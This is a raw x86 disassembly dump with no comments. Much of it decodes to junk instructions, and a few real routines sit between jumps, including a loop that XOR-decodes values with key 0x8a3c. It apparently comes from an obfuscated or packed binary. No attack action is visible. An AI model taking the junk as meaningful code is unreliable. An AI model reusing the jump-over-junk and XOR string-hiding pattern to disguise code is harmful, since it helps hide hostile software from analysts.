  4031a3:	jecxz  0x40312f
  4031a5:	out    0x53,al
  4031a7:	sub    cl,BYTE PTR [ebp+0x2b]
  4031aa:	add    al,0x75
  4031ac:	cld    
  4031ad:	sbb    eax,0x1feb59c2
  4031b2:	test   BYTE PTR [ebx],cl
  4031b4:	iret   
  4031b5:	pop    ebx
  4031b6:	pop    edx
  4031b7:	hlt    
  4031b8:	sbb    ah,cl
  4031ba:	and    DWORD PTR [ebx+0x594d31e5],esp
  4031c0:	add    esp,DWORD PTR [ebx]
  4031c2:	fnstsw WORD PTR [ebx-0x7b486e60]
  4031c8:	xchg   BYTE PTR [esi],ah
  4031ca:	sub    ecx,0x87ac708b
  4031d0:	arpl   WORD PTR [ecx-0x2ee10c59],sp
  4031d6:	push   edx
  4031d7:	sbb    BYTE PTR [esi-0x23ead02c],dh
  4031dd:	inc    dh
  4031df:	inc    esp
  4031e0:	and    cl,0x6
  4031e3:	pushf  
  4031e4:	xor    edx,edx
  4031e6:	outs   dx,DWORD PTR ds:[esi]
  4031e7:	cmp    DWORD PTR [edi],ebp
  4031e9:	and    eax,0xcfa1d956
  4031ee:	and    DWORD PTR [edi],ebp
  4031f0:	sub    eax,0x8fe2cad0
  4031f5:	xchg   ecx,eax
  4031f6:	mov    edi,0x4742f481
  4031fb:	jnp    0x4031d9
  4031fd:	sbb    al,0xf6
  4031ff:	nop
  403200:	mov    ebp,0xbab2bb0d
  403205:	pop    esi
  403206:	mov    eax,0x21eb9baa
  40320b:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  403212:	mov    DWORD PTR [ebp-0x10],0xf89c8532
  403219:	or     DWORD PTR ds:0x42ed6f,ecx
  40321f:	mov    eax,DWORD PTR [ebp-0x8]
  403222:	movzx  ecx,WORD PTR ds:0x42ed4b
  403229:	adc    DWORD PTR ds:0x430457,ecx
  40322f:	mov    ecx,0x7510854
  403234:	sub    DWORD PTR ds:0x42e748,0x77ef
  40323e:	push   esi
  40323f:	xor    eax,ecx
  403241:	and    DWORD PTR ds:0x4303e1,0x33b1
  40324b:	jmp    0x403418
  403250:	inc    ecx
  403251:	jp     0x4031f4
  403253:	cs popa 
  403255:	mov    ch,0x51
  403257:	jno    0x403251
  403259:	(bad)  
  40325b:	pop    edi
  40325c:	pop    ebp
  40325d:	dec    edx
  40325e:	hlt    
  40325f:	rcl    BYTE PTR ss:[esi],cl
  403262:	jle    0x4032e2
  403264:	scas   al,BYTE PTR es:[edi]
  403265:	jg     0x4032e5
  403267:	jle    0x4032ca
  403269:	push   ss
  40326a:	xchg   edi,eax
  40326b:	fs enter 0xd2df,0xa5
  403270:	sub    BYTE PTR [edx],bh
  403272:	clc    
  403273:	jp     0x40322d
  403275:	lock sbb DWORD PTR [ebx],edx
  403278:	pop    ecx
  403279:	mov    WORD PTR [edx+ebp*2],gs
  40327c:	ins    DWORD PTR es:[edi],dx
  40327d:	leave  
  40327e:	(bad)  [edi+0x6dbdd338]
  403284:	pop    ebx
  403285:	(bad)  
  403286:	in     eax,dx
  403287:	mov    esi,0xbdccbbb8
  40328c:	mov    al,0x11
  40328e:	jecxz  0x4032be
  403290:	call   0xd54cf70
  403295:	ret    
  403296:	jge    0x403220
  403298:	ror    DWORD PTR [ecx+ebx*8-0x773c62ce],1
  40329f:	jbe    0x40329a
  4032a1:	mov    esi,0xf1c66a87
  4032a6:	inc    ebp
  4032a7:	pop    edi
  4032a8:	gs leave 
  4032aa:	mov    ds:0x5cc79516,eax
  4032af:	bound  eax,QWORD PTR [esi]
  4032b1:	iret   
  4032b2:	xchg   edx,eax
  4032b3:	fwait
  4032b4:	std    
  4032b5:	mov    ds:0xdb90a611,al
  4032ba:	ror    ebx,1
  4032bc:	mov    cl,BYTE PTR [eax+esi*2-0x75522a6d]
  4032c3:	mov    eax,0x7700c682
  4032c8:	pop    eax
  4032c9:	repnz xchg esp,eax
  4032cb:	push   esp
  4032cc:	xchg   esi,eax
  4032cd:	mov    cl,0x93
  4032cf:	mov    DWORD PTR [eax],eax
  4032d1:	clc    
  4032d2:	lahf   
  4032d3:	add    dl,ch
  4032d5:	or     eax,0x18ec5f35
  4032da:	sahf   
  4032db:	inc    edx
  4032dc:	mov    edi,esi
  4032de:	push   ss
  4032df:	mov    dl,0xe8
  4032e1:	nop
  4032e2:	into   
  4032e3:	add    BYTE PTR [ebx],cl
  4032e5:	xor    bh,BYTE PTR [esi]
  4032e7:	mov    esp,0xfc7082e8
  4032ec:	mov    ah,cl
  4032ee:	aaa    
  4032ef:	lods   al,BYTE PTR ds:[esi]
  4032f0:	test   BYTE PTR [eax-0x382a0b31],ah
  4032f6:	or     eax,0x7d7b7e80
  4032fb:	shr    al,cl
  4032fd:	xchg   edi,eax
  4032fe:	jae    0x4032ab
  403300:	pop    esp
  403301:	arpl   WORD PTR [edx],dx
  403303:	das    
  403304:	dec    edx
  403305:	sub    eax,0x6d9464f3
  40330a:	push   ecx
  40330b:	or     eax,0x781864a6
  403310:	pop    ecx
  403311:	out    0x95,eax
  403313:	mov    bl,0x90
  403315:	sub    eax,0x1a1a3b34
  40331a:	pop    ebp
  40331b:	rcl    BYTE PTR [edi+0x73],cl
  40331e:	aam    0x3d
  403320:	mov    esi,0xed62e083
  403325:	mov    DWORD PTR [ebp-0x44],edi
  403328:	mov    bh,0xc
  40332a:	enter  0x7c2a,0x34
  40332e:	xor    eax,0x4cdb7ebf
  403333:	push   edx
  403334:	shl    BYTE PTR [ebx-0x45],1
  403337:	fld    TBYTE PTR [esi]
  403339:	and    eax,0x17d5613b
  40333e:	jle    0x4033b7
  403340:	stc    
  403341:	mov    edx,0x2c03d85b
  403346:	jmp    0x40334e
  403348:	pop    ebp
  403349:	inc    edi
  40334a:	fdivr  st(4),st
  40334c:	addr16 jbe 0x403314
  40334f:	xor    DWORD PTR [ebx+0x4d],eax
  403352:	add    DWORD PTR [edi-0x7938164b],edi
  403358:	sbb    dh,BYTE PTR [edx]
  40335a:	rol    ecx,0x47
  40335d:	test   BYTE PTR [eax-0x6e09578f],dh
  403363:	push   edx
  403364:	cdq    
  403365:	jbe    0x4033be
  403367:	in     eax,dx
  403368:	or     al,0x31
  40336a:	stos   BYTE PTR es:[edi],al
  40336b:	sbb    al,0xa9
  40336d:	fisttp DWORD PTR [esi]
  40336f:	in     eax,dx
  403370:	dec    edx
  403371:	sub    al,0x8b
  403373:	xlat   BYTE PTR ds:[ebx]
  403374:	jle    0x403363
  403376:	dec    eax
  403377:	jae    0x40330b
  403379:	or     al,0xef
  40337b:	icebp  
  40337c:	outs   dx,BYTE PTR ds:[esi]
  40337d:	mov    BYTE PTR [eax-0x55],bh
  403380:	test   eax,0xefe1a1f4
  403385:	sbb    eax,0x57c4e2c2
  40338a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40338b:	sbb    bl,BYTE PTR [ebx-0x35bd41e3]
  403391:	pop    esp
  403392:	ss jnp 0x40335d
  403395:	sahf   
  403396:	loop   0x40340d
  403398:	adc    ebx,DWORD PTR [ebx+0x64]
  40339b:	pop    ecx
  40339c:	mov    al,BYTE PTR [eax]
  40339e:	jmp    0xc7ae:0x607c2b67
  4033a5:	(bad)  
  4033a6:	or     al,0x2c
  4033a8:	push   ebp
  4033a9:	push   0x2b3a0449
  4033ae:	mov    edi,0x4a151b3
  4033b3:	cli    
  4033b4:	cwde   
  4033b5:	addr16 dec edi
  4033b7:	jl     0x40336f
  4033b9:	div    DWORD PTR [edi+0x2b]
  4033bc:	int    0xc8
  4033be:	mov    ds:0x256a2aad,eax
  4033c3:	es jl  0x403354
  4033c6:	loopne 0x4033a3
  4033c8:	push   0x2eb8853
  4033cd:	sub    BYTE PTR [edx+ebp*1+0x4f],ah
  4033d1:	xchg   BYTE PTR [ecx+eax*1+0x28],bh
  4033d5:	xor    DWORD PTR [ecx],0x48
  4033d8:	mov    esp,0x9f76218a
  4033dd:	push   edx
  4033df:	adc    eax,0xe72d0e2
  4033e4:	adc    al,0xaf
  4033e6:	xchg   esi,eax
  4033e7:	(bad)  
  4033e8:	cmp    ah,BYTE PTR ds:0xd7cb4f87
  4033ee:	jle    0x4033c0
  4033f0:	imul   esi,DWORD PTR [esi+0x1de0960c],0x3086588c
  4033fa:	cmp    BYTE PTR [esi+eax*8-0x2c],dl
  4033fe:	mov    ds:0x986940ff,al
  403403:	in     eax,0x23
  403405:	imul   edx,esi,0x70c34e8
  40340b:	cdq    
  40340c:	repz pop ebp
  40340e:	mov    esi,0xdc442f2
  403413:	imul   ebp,DWORD PTR [ebp+0x33],0x9bbe897d
  40341a:	jb     0x40344e
  40341c:	add    bh,dh
  40341e:	sbb    eax,0x4303d9
  403423:	add    eax,esi
  403425:	jmp    0x403432
  40342a:	mov    dl,BYTE PTR [ebp-0x1]
  40342d:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  403431:	inc    eax
  403432:	cmp    eax,0x40
  403435:	jb     0x40342a
  40343b:	mov    edx,DWORD PTR [ebp-0x8]
  40343e:	mov    eax,DWORD PTR [ebp-0xc]
  403441:	jmp    0x40360e
  403446:	mov    ds:0x9b821f26,eax
  40344b:	and    DWORD PTR [ebx-0x712401d9],0xffffff90
  403452:	and    DWORD PTR [eax],edi
  403454:	loop   0x403480
  403456:	add    dl,BYTE PTR [esi+edi*2]
  403459:	jle    0x403409
  40345b:	jg     0x4034db
  40345d:	jle    0x4034d9
  40345f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403460:	push   0xffffff97
  403462:	stc    
  403463:	cs mov dl,0x2d
  403466:	push   edx
  403467:	mov    eax,ds:0x58319546
  40346c:	pop    ebp
  40346d:	and    dl,BYTE PTR [edi+0x7a]
  403470:	dec    esi
  403471:	adc    ebx,DWORD PTR [ebx+0x66f61297]
  403477:	in     eax,dx
  403478:	mov    al,0x90
  40347a:	sbb    ecx,ecx
  40347c:	mov    ah,0x6
  40347e:	dec    ch
  403480:	sub    al,BYTE PTR [edx+ecx*8]
  403483:	xchg   esi,eax
  403484:	dec    esi
  403485:	mov    DWORD PTR [eax-0x1554a997],esi
  40348b:	dec    esi
  40348c:	xor    al,0x22
  40348e:	and    esi,DWORD PTR [esi-0xca63d45]
  403494:	and    ecx,edi
  403496:	cld    
  403497:	fwait
  403498:	rcl    BYTE PTR [ebx+0x78],1
  40349b:	jno    0x4034d3
  40349d:	out    0xd8,al
  40349f:	pushf  
  4034a0:	adc    eax,0xa5f6a31f
  4034a5:	add    edi,DWORD PTR [esp+esi*1+0x57b033d9]
  4034ac:	mov    ds:0x77c69b9d,al
  4034b1:	sar    bh,1
  4034b3:	adc    cl,bh
  4034b5:	and    al,0xc0
  4034b7:	and    al,0x7d
  4034b9:	jmp    0x2902281e
  4034be:	pop    ebp
  4034bf:	mov    al,0x5a
  4034c1:	imul   edi,DWORD PTR [eax],0x4e
  4034c4:	mov    al,0x6c
  4034c6:	fstp   DWORD PTR [ebp-0x393ed470]
  4034cc:	xor    ebx,edi
  4034ce:	aas    
  4034cf:	and    al,0x71
  4034d1:	jb     0x403535
  4034d3:	or     ebx,eax
  4034d5:	popa   
  4034d6:	inc    esp
  4034d7:	xor    eax,0x452dcf54
  4034dc:	hlt    
  4034dd:	(bad)  
  4034de:	mov    WORD PTR [edi+0x27],?
  4034e1:	les    ebp,FWORD PTR [ebx]
  4034e3:	or     bl,BYTE PTR ds:0xcd9e89c7
  4034e9:	mov    ah,0x61
  4034eb:	sub    eax,DWORD PTR [esi-0x48]
  4034ee:	or     dl,cl
  4034f0:	pop    esi
  4034f1:	xor    eax,0xdc350021
  4034f6:	adc    DWORD PTR [edi+edx*8-0x37],edi
  4034fa:	xlat   BYTE PTR ds:[ebx]
  4034fb:	push   cs
  4034fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4034fd:	jecxz  0x403571
  4034ff:	ret    
  403500:	retf   0xdfe9
  403503:	mov    al,ds:0x8568dc0b
  403508:	arpl   WORD PTR [ecx+0x15],dx
  40350b:	ins    DWORD PTR es:[edi],dx
  40350c:	xor    eax,0x828e65d3
  403511:	in     eax,dx
  403512:	sbb    BYTE PTR [ecx-0x1ac83960],ah
  403518:	imul   ax,WORD PTR [eax-0x547dadcc],0x7
  403520:	in     eax,0x23
  403522:	xor    BYTE PTR [esi],al
  403524:	imul   ebp,DWORD PTR [ecx-0x27],0xffffff8b
  403528:	xlat   BYTE PTR ds:[ebx]
  403529:	pushf  
  40352a:	and    esi,ebx
  40352c:	fld    DWORD PTR [edx+0x7c]
  40352f:	(bad)  
  403530:	dec    edi
  403531:	sbb    bl,BYTE PTR [esi-0x6352eaa0]
  403537:	jns    0x4035a9
  403539:	repz sahf 
  40353b:	adc    eax,0x2b3f9df5
  403540:	repnz mov ch,0x3e
  403543:	and    al,0x3e
  403545:	pushw  ss
  403547:	and    DWORD PTR [edx],esp
  403549:	sub    DWORD PTR [ebp-0x3c],esp
  40354c:	lea    ebx,[eax+eiz*8]
  40354f:	ret    0x27c7
  403552:	mov    esp,DWORD PTR [esi]
  403554:	fidivr DWORD PTR [ebx+ecx*2]
  403557:	add    ebp,DWORD PTR [edi]
  403559:	rcl    DWORD PTR [edi-0xb],0x6a
  40355d:	sbb    bh,bh
  40355f:	aam    0x69
  403561:	push   es
  403562:	hlt    
  403563:	push   eax
  403564:	jmp    0x58e3:0x85f765e0
  40356b:	push   ds
  40356c:	jle    0x4034f6
  40356e:	xchg   BYTE PTR [esi+0x422f4b58],dh
  403574:	aad    0xca
  403576:	and    edx,0x7e
  403579:	xchg   ecx,eax
  40357a:	out    0xd9,eax
  40357c:	aam    0xaf
  40357e:	loope  0x40359f
  403580:	jbe    0x40356a
  403582:	cmc    
  403583:	pop    edx
  403584:	call   0xbb2a:0xcb11337a
  40358b:	add    dl,al
  40358d:	fnstsw WORD PTR [edx+0x3229a425]
  403593:	mov    cl,0xbf
  403595:	std    
  403596:	xchg   BYTE PTR [esi-0xd],ah
  403599:	dec    edi
  40359a:	inc    ebx
  40359b:	mov    bh,cl
  40359d:	jb     0x40360f
  40359f:	cdq    
  4035a0:	into   
  4035a1:	scas   al,BYTE PTR es:[edi]
  4035a2:	inc    ecx
  4035a3:	sbb    BYTE PTR [edx*8+0x4f3996b9],cl
  4035aa:	jp     0x40354a
  4035ac:	enter  0xf487,0xd4
  4035b0:	cmp    ch,BYTE PTR ds:[ebx-0x532a1a2a]
  4035b7:	mov    ebx,0x7461a370
  4035bc:	in     al,0xfc
  4035be:	inc    edi
  4035bf:	push   edi
  4035c0:	les    esi,FWORD PTR [edi-0x29eb8651]
  4035c6:	test   al,0x5e
  4035c8:	nop
  4035c9:	nop
  4035ca:	mov    bh,0x52
  4035cc:	es pop ss
  4035ce:	pop    edx
  4035cf:	int3   
  4035d0:	mov    al,0xc3
  4035d2:	loopne 0x403559
  4035d4:	jno    0x403614
  4035d6:	mov    bh,0xdc
  4035d8:	mov    esp,0xeafd4524
  4035dd:	xchg   BYTE PTR [edi-0x6d65805a],bl
  4035e3:	mov    eax,0x25a209e7
  4035e8:	and    eax,0xd4365be1
  4035ed:	ret    0x3dc
  4035f0:	jbe    0x40365f
  4035f2:	mov    ah,0x9d
  4035f4:	dec    edx
  4035f5:	push   eax
  4035f6:	lahf   
  4035f7:	adc    BYTE PTR [ebp+0x63a1f7b0],dl
  4035fd:	out    0xc4,eax
  4035ff:	pop    ss
  403600:	inc    ecx
  403601:	mov    ch,0x60
  403603:	aaa    
  403604:	pop    ebp
  403605:	push   ss
  403606:	fisubr DWORD PTR [ecx-0x31]
  403609:	mov    WORD PTR [edx],cs
  40360b:	sbb    eax,0xd13306ab
  403610:	add    edx,esi
  403612:	cmp    edx,eax
  403614:	je     0x40365a
  40361a:	push   ebx
  40361b:	push   edi
  40361c:	mov    edi,DWORD PTR [ebp+0x8]
  40361f:	mov    eax,0x8a3c
  403624:	xor    ax,WORD PTR [edi+edx*4+0x2]
  403629:	mov    edi,0x3b02
  40362e:	add    ax,di
  403631:	movzx  eax,ax
  403634:	mov    DWORD PTR [ebp-0x14],eax
  403637:	mov    eax,DWORD PTR [ebp+0x8]
  40363a:	movzx  eax,WORD PTR [eax+edx*4]
  40363e:	xor    eax,0x8a3c
  403643:	add    eax,edi
  403645:	mov    edi,DWORD PTR [ebp-0x14]
  403648:	mov    BYTE PTR [ebp+edi*1-0x58],al
  40364c:	mov    eax,DWORD PTR [ebp-0xc]
  40364f:	inc    edx
  403650:	cmp    edx,eax
  403652:	jne    0x40361c
  403658:	pop    edi
  403659:	pop    ebx
  40365a:	mov    eax,DWORD PTR [ebp-0x8]
  40365d:	jmp    0x40382a
  403662:	jo     0x403624
  403664:	add    ecx,DWORD PTR [eax-0x1f8eb64d]
  40366a:	mov    esp,0x9d3dd7c8
  40366f:	lods   eax,DWORD PTR ds:[esi]
  403670:	or     ebp,DWORD PTR [edx+esi*4-0x518181eb]
  403677:	jg     0x4036f7
  403679:	jle    0x403600
  40367b:	push   esi
  40367c:	add    al,0x61
  40367e:	(bad)  
  40367f:	jnp    0x4036a6
  403681:	sub    DWORD PTR [ecx+0x59eb8d3a],edi
  403687:	xchg   esi,eax
  403688:	mov    eax,ds:0xa103b92
  40368d:	push   eax
  40368e:	test   eax,0x10658ee6
  403693:	fisttp WORD PTR [eax-0x54]
  403696:	jns    0x4036d9
  403698:	xor    BYTE PTR [ecx],dl
  40369a:	jmp    0xe416e22f
  40369f:	sub    BYTE PTR ds:0xd804283b,cl
  4036a5:	dec    ebx
  4036a6:	sub    ah,BYTE PTR [eax-0x73]
  4036a9:	sub    eax,0xafc4f98c
  4036ae:	sar    DWORD PTR [edx-0x7f],0xa4
  4036b2:	dec    eax
  4036b3:	stos   DWORD PTR es:[edi],eax
  4036b4:	call   0x439c:0x77a1e483
  4036bb:	mov    DWORD PTR [ebp+esi*8+0x6972d84c],ecx
  4036c2:	ret    0x21e7
  4036c5:	xor    BYTE PTR [edi-0x3f5b230f],dl
  4036cb:	pop    ebp
  4036cc:	jne    0x4036b7
  4036ce:	or     DWORD PTR [ebp+0x4d],eax
  4036d1:	xchg   esp,eax
  4036d2:	xor    al,0x2e
  4036d4:	(bad)  
  4036d5:	cli    
  4036d6:	cmp    ecx,DWORD PTR [edi-0x633efba8]
  4036dc:	and    ecx,DWORD PTR [ebx+ebp*1]
  4036df:	sti    
  4036e0:	enter  0x368a,0xbd
  4036e4:	or     DWORD PTR [edi+0x2bdaac93],esi
  4036ea:	push   ecx
  4036eb:	xor    dh,dh
  4036ed:	cmp    DWORD PTR [esi],esp
  4036ef:	jae    0x4036cc
  4036f1:	rcr    cl,1
  4036f3:	les    ebx,FWORD PTR [eax+0x24]
  4036f6:	xchg   esi,eax
  4036f7:	sar    DWORD PTR [esi+esi*4-0x375ce17b],cl
  4036fe:	jg     0x403754
  403700:	push   ebx
  403701:	xor    BYTE PTR [esi],ch
  403703:	retf   
  403704:	pop    edi
  403705:	daa    
  403706:	jae    0x40371d
  403708:	mov    esi,0xf78b2bee
  40370d:	mov    ah,0xee
  40370f:	pop    DWORD PTR [ebx-0x64]
  403712:	mov    edi,0x3a5e8855
  403717:	out    dx,eax
  403718:	(bad)  
  403719:	inc    DWORD PTR [esi+ebx*4]
  40371c:	mov    edx,0x63b7c6a1
  403721:	ror    BYTE PTR ds:0xe010eac8,cl
  403727:	stos   BYTE PTR es:[edi],al
  403728:	xor    bh,BYTE PTR [ecx]
  40372a:	cli    
  40372b:	gs jns 0x40375f
  40372e:	or     eax,ebp
  403730:	add    al,0x4e
  403732:	gs mov ch,0x64
  403735:	lods   eax,DWORD PTR ds:[esi]
  403736:	loop   0x4037b7
  403738:	mov    edx,0x53f6801c
  40373d:	sub    edx,DWORD PTR [ecx-0x43400bad]
  403743:	in     eax,0x89
  403745:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403746:	mov    dh,0xcd
  403748:	loopne 0x4037c0
  40374a:	repz push ds
  40374c:	mov    esp,0xcd81ea5f
  403751:	push   esp
  403752:	arpl   WORD PTR [eax+0x1287ac0f],cx
  403758:	mov    esp,0x2b62f749
  40375d:	pop    ds
  40375e:	xlat   BYTE PTR ds:[ebx]
  40375f:	jge    0x40371d
  403761:	shl    DWORD PTR [edx-0xe],1
  403764:	call   0x60f166d0
  403769:	or     eax,0x20e6106c
  40376e:	test   DWORD PTR [ecx],esp
  403770:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403771:	iret   
  403772:	popf   
  403773:	sbb    eax,DWORD PTR [edx+eiz*8]
  403776:	(bad)  [ebx]
  403778:	xor    DWORD PTR [edi-0x5d492d81],ebp
  40377e:	or     ebp,edi
  403780:	fstp   DWORD PTR [ecx-0x1e]
  403783:	inc    ebx
  403784:	or     esp,DWORD PTR [ebp+0xbdb2124]
  40378a:	push   ecx
  40378b:	mov    sp,0x8a40
  40378f:	in     eax,0x66
  403791:	jbe    0x40374a
  403793:	retf   
  403794:	xor    DWORD PTR [eax-0x50022d0d],ebx
  40379a:	mov    WORD PTR [ecx],?
  40379c:	ret    
  40379d:	or     DWORD PTR [ecx+eiz*4],ecx
  4037a0:	xor    bh,BYTE PTR [ebx]
  4037a2:	iret   
  4037a3:	push   ebx
  4037a4:	test   al,0x30
  4037a6:	add    ebx,DWORD PTR [ecx-0x4cbe136f]
  4037ac:	jnp    0x403767
  4037ae:	fcmovu st,st(7)
  4037b0:	out    dx,eax
  4037b1:	leave  
  4037b2:	lods   al,BYTE PTR ds:[si]
  4037b4:	inc    ebp
  4037b5:	inc    ebx
  4037b6:	add    DWORD PTR [eax+0x74e4cbe4],edi
  4037bc:	dec    BYTE PTR [ebp-0x3d4f1958]
  4037c2:	lods   al,BYTE PTR ds:[esi]
  4037c3:	dec    eax
  4037c4:	ffree  st(3)
  4037c6:	fisttp WORD PTR [ebp+0x36bf15cb]
  4037cc:	gs iret 
  4037ce:	or     edx,DWORD PTR [edi+0x32]
  4037d1:	(bad)  
  4037d2:	push   ds
  4037d3:	cmp    dh,dl
  4037d5:	push   ecx
  4037d6:	cmp    ebx,DWORD PTR [ebp+0x3]
  4037d9:	xchg   esp,esi
  4037db:	mov    al,ds:0xf54f8dc0
  4037e0:	cmp    ebx,DWORD PTR [eax+0x7c]
  4037e3:	cmc    
  4037e4:	xor    DWORD PTR [edx-0x29a85cf2],ecx
  4037ea:	out    0xd7,eax
  4037ec:	cwde   
  4037ed:	jg     0x4037a6
  4037ef:	jle    0x403828
  4037f1:	fdiv   QWORD PTR [edx-0x731248e0]
  4037f7:	call   0x35c2:0x14b58962
  4037fe:	or     BYTE PTR [edi+0x476d8ce6],dl
  403804:	fsubr  st(7),st
  403806:	push   edx
  403807:	mov    edi,0xd5ed15a9
  40380c:	push   ecx
  40380d:	and    DWORD PTR [esi],ebp
  40380f:	leave  
  403810:	add    ah,cl
  403812:	inc    edx
  403813:	jnp    0x4037e8
  403815:	xchg   esi,eax
  403816:	stos   DWORD PTR es:[edi],eax
  403817:	cmc    
  403818:	mov    eax,0xcb51971b
  40381d:	gs xchg ebp,eax
  40381f:	clc    
  403820:	mov    ch,0x72
  403822:	sub    DWORD PTR [ecx+0x5f],edi
  403825:	es inc eax
  403827:	sbb    BYTE PTR [ecx+0xe],al
  40382a:	mov    edx,DWORD PTR [ebp+0x10]
  40382d:	xor    eax,ecx
  40382f:	add    eax,esi
  403831:	jmp    0x4039fe
  403836:	jl     0x403858
  403838:	mov    cl,0xb0
  40383a:	mov    cl,0xb1
  40383c:	jge    0x4037ee
  40383e:	fld    QWORD PTR [edi]
  403840:	call   0x5aeb5823
  403845:	pop    esp
  403846:	loop   0x40385b
  403848:	jle    0x4038c8
  40384a:	scas   al,BYTE PTR es:[edi]
  40384b:	jg     0x4038cb
  40384d:	jle    0x4037d8
  40384f:	adc    ebx,eax
  403851:	pop    edx
  403852:	jle    0x40384c
  403854:	lods   eax,DWORD PTR ds:[esi]
  403855:	lds    esp,FWORD PTR [edi-0x3230dee0]
  40385b:	mov    ebx,0x8cfab2ef
  403860:	popa   
  403861:	mov    edi,0x8127e2db
  403866:	mov    eax,ds:0xcf14a037
  40386b:	sbb    DWORD PTR [ebx-0x59],esi
  40386e:	sub    BYTE PTR [edi],al
  403870:	mov    ecx,0xad8dec62
  403875:	loopne 0x403885
  403877:	icebp  
  403878:	sub    DWORD PTR [esi],edx
  40387a:	ret    
  40387b:	retf   0x4afc
  40387e:	aaa    
  40387f:	pop    esp
  403880:	loop   0x40381d
  403882:	sti    
  403883:	(bad)  
  403884:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403885:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403886:	lods   al,BYTE PTR ds:[esi]
  403887:	jne    0x4038cf
  403889:	jbe    0x40385d
  40388b:	jge    0x403844
  40388d:	mov    ds:0x1d4f4936,al
  403892:	adc    BYTE PTR [edi-0x27],bh
  403895:	xor    DWORD PTR [eax+0x117fa2b5],0xffffffb2
  40389c:	jle    0x4038a9
  40389e:	mov    bh,0x1b
  4038a0:	push   bx
  4038a2:	sub    ebp,ebp
  4038a4:	adc    DWORD PTR [ebx+0x149cb9d5],edi
  4038aa:	(bad)  
  4038ab:	in     eax,dx
  4038ac:	int3   
  4038ad:	inc    edx
  4038ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4038af:	and    eax,0xcdc79fd2
  4038b4:	mov    DWORD PTR [esi],ecx
  4038b6:	data16 and dl,BYTE PTR [ebx]
  4038b9:	sbb    BYTE PTR [esi],0x8c
  4038bc:	enter  0x2913,0x5e
  4038c0:	ret    0x3484
  4038c3:	repnz mov dh,0x97
  4038c6:	mov    cl,0x3a
  4038c8:	mov    ebx,0x9cbec39a
  4038cd:	xchg   ebx,eax
  4038ce:	dec    edi
  4038cf:	dec    esp
  4038d0:	ret    
  4038d1:	xor    al,0xb9
  4038d3:	jg     0x403916
  4038d5:	push   eax
  4038d6:	out    0xae,eax
  4038d8:	mov    al,0x2e
  4038da:	daa    
  4038db:	mov    ah,0x50
  4038dd:	loopne 0x403902
  4038df:	pop    ecx
  4038e0:	data16 jns 0x403882
  4038e3:	ret    
  4038e4:	(bad)  
  4038e5:	adc    BYTE PTR [ebx+0x74],bh
  4038e8:	sbb    DWORD PTR [esi],ecx
  4038ea:	sub    DWORD PTR [eax-0x62],0x4fa9ccba
  4038f1:	push   0x1af713c7
  4038f6:	cmp    eax,0x37a33aa3
  4038fb:	ja     0x4038de
  4038fd:	or     DWORD PTR [edx-0x3f1180d3],ebx
  403903:	sahf   
  403904:	inc    esp
  403905:	dec    edx
  403906:	out    dx,al
  403907:	lock jbe 0x40392b
  40390a:	test   al,0xbe
  40390c:	rcr    esp,1
  40390e:	jae    0x403953
  403910:	xchg   esi,eax
  403911:	jmp    0x3a8a:0x472497c2
  403918:	mov    bh,0xe4
  40391a:	jo     0x4038cf
  40391c:	and    edi,DWORD PTR [ebp+edx*2+0x58]
  403920:	jo     0x4038ac
  403922:	mov    ds:0xe43ad3c6,al
  403927:	iret   
  403928:	sub    eax,0xfbefc290
  40392d:	jle    0x40392a
  40392f:	jmp    0x403918
  403931:	cmc    
  403932:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403933:	ret    0x5ca3
  403936:	cmp    al,0xf2
  403938:	cwde   
  403939:	sbb    DWORD PTR [ebx+0x737209c2],esp
  40393f:	push   ss
  403940:	jge    0x40398d
  403942:	in     eax,0x69
  403944:	add    edi,ecx
  403946:	mov    eax,0xc91ff4c1
  40394b:	aam    0xe2
  40394d:	add    eax,ebx
  40394f:	cmp    dh,ch
  403951:	scas   al,BYTE PTR es:[edi]
  403952:	push   0xffffffb0
  403954:	(bad)  [ecx]
  403956:	outs   dx,BYTE PTR ds:[esi]
  403957:	pusha  
  403958:	repz ja 0x4039d8
  40395b:	sbb    DWORD PTR [eax],esp
  40395d:	jge    0x4039d1
  40395f:	xor    al,0xd4
  403961:	jb     0x4038e4
  403963:	pop    edi
  403964:	mov    ecx,0xf3d8ca01
  403969:	add    cl,BYTE PTR [edx-0x410350a]
  40396f:	ja     0x403976
  403971:	outs   dx,BYTE PTR ds:[esi]
  403972:	ret    0xce00
  403975:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403976:	fcomp  QWORD PTR [edx]
  403978:	push   edi
  403979:	test   eax,0xa7ce32be
  40397e:	cmp    BYTE PTR [esi-0x10],0x30
  403982:	mov    al,ds:0x8fcff00
  403987:	mov    dh,0xc
  403989:	(bad)  
  40398a:	retf   0xdf9
  40398d:	ja     0x4039b8
  40398f:	pop    esp
  403990:	and    al,0x80
  403992:	out    0xe1,al
  403994:	in     al,dx
  403995:	jle    0x403a0d
  403997:	jae    0x403943
  403999:	push   edx
  40399a:	repz inc edx
  40399c:	push   esp
  40399d:	push   es
  40399e:	dec    edi
  40399f:	in     eax,0xc0
  4039a1:	inc    esp
  4039a2:	add    al,0x16
  4039a4:	sbb    bl,BYTE PTR es:[ebx+0x49f9777a]
  4039ab:	dec    ebx
  4039ac:	xor    cl,cl
  4039ae:	lahf   
  4039af:	outs   dx,DWORD PTR ds:[esi]
  4039b0:	int    0x88
  4039b2:	popf   
  4039b3:	and    eax,0x9e8b1ad3
  4039b8:	sub    ah,BYTE PTR [edi-0x2536db8c]
  4039be:	outs   dx,DWORD PTR ds:[esi]
  4039bf:	cmp    DWORD PTR [edi],ecx
  4039c1:	xchg   ecx,eax
  4039c2:	xchg   edx,eax
  4039c3:	jno    0x403a0c
  4039c5:	xchg   BYTE PTR [esi+0x44],bl
  4039c8:	jnp    0x403960
  4039ca:	and    BYTE PTR ds:0x59d26cd8,bh
  4039d0:	repz mov edi,0x3602bf69
  4039d6:	jbe    0x4039ec
  4039d8:	or     eax,0x281f8e73
